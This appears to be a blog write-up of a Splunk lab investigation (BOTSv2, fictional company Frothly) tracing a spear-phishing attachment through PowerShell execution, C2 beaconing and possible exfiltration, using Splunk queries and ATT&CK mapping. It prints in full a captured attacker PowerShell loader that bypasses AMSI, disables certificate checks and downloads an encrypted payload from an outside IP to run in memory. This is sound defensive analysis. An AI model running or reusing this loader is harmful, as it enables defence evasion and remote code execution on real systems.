## Spear-Phishing Investigation & Lateral Movement Analysis with Splunk ES

### Environment & Scenario Context

Following notification from federal authorities, Frothly identified suspected intrusion activity attributed to **Taaedonggang APT**, a threat group known to target Western supply-chain organizations.

The objective of this investigation was to determine whether a spear-phishing campaign resulted in successful initial access, subsequent execution, lateral movement, and data exfiltration within the environment.

**Platform:** Splunk Enterprise Security
**Timeframe:** August 2017
**ATT&CK Focus:**

* T1566.001 – Spearphishing Attachment
* T1059.001 – PowerShell
* T1105 – Ingress Tool Transfer

---

### Initial Access Analysis (Email Telemetry)

Email telemetry (`stream:smtp`) within the `botsv2` index was reviewed to identify delivery of suspicious attachments.

![Alt text](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0xFZ5lsjKA6eoG1VNu6vww.png)

**Findings:**

* Multiple copies of **invoice.zip** delivered to several users
* Consistent filename and hash reused across deliveries
* Messages originated from Jim Smith - `jsmith@urinalysis.com`
* Attachments included `.zip` and `.torrent` files, anomalous for business email

Sender analysis showed:

* Domain had no legitimate web presence
* WHOIS data indicated disposable infrastructure
* Embedded hyperlinks pointed to a third-party bulk email service, suggesting abuse of legitimate delivery mechanisms

These indicators supported a targeted spear-phishing campaign rather than commodity spam.

---

### Execution Confirmation (Endpoint Telemetry)

Host-based telemetry (`Sysmon EventCode=1`) was queried to confirm whether the attachment was executed.
```kql
index=botsv2 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" earliest="08/01/2017:00:00:00" latest="09/01/2017:00:00:00"
EventCode=1
| search CommandLine="*invoice.zip*"
| convert ctime(_time) 
| table _time host User ParentImage Image CommandLine 
| sort _time
```
Execution was confirmed on host **wrk-btun** on **08/23/2017 20:28:55**, establishing patient zero.

![Alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*h_RSzfv93JtRj96qQvG4yw.png)

Sysmon activity on the same host revealed:

* File creation/modification events consistent with macro execution
* Process creation spawning `conhost.exe`
* Encoded PowerShell execution shortly after attachment interaction

![Alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*6SOh7f_q_AQu6DHBgwOreg.png)

---

### PowerShell Behavior Analysis
```
[REF].ASSEmblY.GeTTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFIELd('amsiInitFailed','NonPublic,Static').SetVaLue($nuLl,$TruE)};[SYsTEM.Net.SerVIcEPOinTMAnAGEr]::EXPEcT100CONtinue=0;$wC=NEw-OBjECT SysTem.NEt.WeBCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADers.Add('User-Agent',$u);$Wc.PROXy=[System.NEt.WEBRequeST]::DefAUltWebPrOxy;$WC.PRoxy.CREDeNtIAls = [SySteM.NET.CRedENtiAlCAChE]::DeFAulTNETWoRkCreDENTIalS;$K=[SysTem.TExt.ENcOdiNG]::ASCII.GetBYTes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}};$WC.HeaDeRS.Add("Cookie","session=jknXpoa7pUA0lDB+nYiQvU9unHg=");$ser='https://45.77.65.211:443';$t='/login/process.php';$DATA=$WC.DoWnLoAdDaTa($SEr+$t);$IV=$DATa[0..3];$dATa=$DaTA[4..$daTa.LeNGtH];-joiN[CHar[]](& $R $data ($IV+$K))|IEX
```
Decoded PowerShell revealed:

* AMSI bypass via reflection on `AmsiUtils`
* Use of `System.Net.WebClient` with forced certificate validation bypass
* Proxy inheritance and custom user-agent
* Retrieval of encrypted payload from `https://45.77.65.211:443/login/process.php`
* In-memory execution via `IEX`

This behavior is consistent with a staged C2 loader designed to fetch and execute a secondary payload while evading inspection.

---

### Lateral Movement & C2 Activity

Network telemetry (`pan:traffic`) was analyzed to identify additional hosts communicating with the same C2 infrastructure.
```kql
sourcetype="pan:traffic" dest_ip="45.77.65.211"
| stats earliest(_time) as first_seen latest(_time) as last_seen count values(src_ip) as src_ips values(src_nt_host) as hosts by dest_ip dest_port 
| mvexpand hosts
| convert ctime(first_seen) ctime(last_seen)
| table hosts src_ips first_seen last_seen count dest_ip dest_port
```

![Alt text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*jBRkcayZtc0OA0e6y0Up-A.png)

**Findings:**

* Multiple internal hosts (`wrk-btun`, `mercury`, `venus`, `wrk-klagerf`) established outbound HTTPS connections to the same external IP
* Repeated connections suggest persistent beaconing rather than one-off retrieval
* Process-level telemetry confirmed suspicious binaries initiating outbound connections:

  * `powershell.exe` (T1059)
  * `msiexec.exe` (T1218)
  * `cscript.exe`

This indicates secondary payload execution and lateral propagation beyond patient zero.

---

### Exfiltration & Impact Assessment

Outbound network volume was analyzed to estimate potential data loss.

```kql
sourcetype="pan:traffic" src_nt_host IN ("wrk-btun","mercury","venus","wrk-klagerf")
| stats sum(bytes_out) as bytes_out by src_nt_host
```

![Alt text](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zy5nhfUaJgXY5dKxHveoGg.png)


Approximate outbound data observed:

* `wrk-btun`: ~49 MB
* `mercury`: ~30 MB
* `wrk-klagerf`: ~25 MB
* `venus`: ~19 MB

Total estimated outbound transfer: **~120 MB**

While the exact data content could not be validated, volume and persistence strongly suggest beaconing and potential data exfiltration.

---

### Conclusion

The investigation confirmed that a spear-phishing attachment (**invoice.zip**) resulted in successful initial access and execution on host **wrk-btun**.

Endpoint telemetry revealed PowerShell-based AMSI evasion and staged payload retrieval from external C2 infrastructure. Network and host telemetry further confirmed lateral movement to additional systems and sustained outbound communications consistent with command-and-control and possible data exfiltration.

**Assessed Impact:**

* Initial Access: Spear-phishing attachment
* Execution: PowerShell loader with AMSI bypass
* C2: HTTPS communication to external IP over port 443
* Lateral Movement: Multiple internal hosts communicating with C2
* Data Exposure: ~120 MB outbound traffic across four hosts

![Alet text](https://miro.medium.com/v2/resize:fit:720/format:webp/1*ehVLXueQ492LTLVkSP4yDA.png)
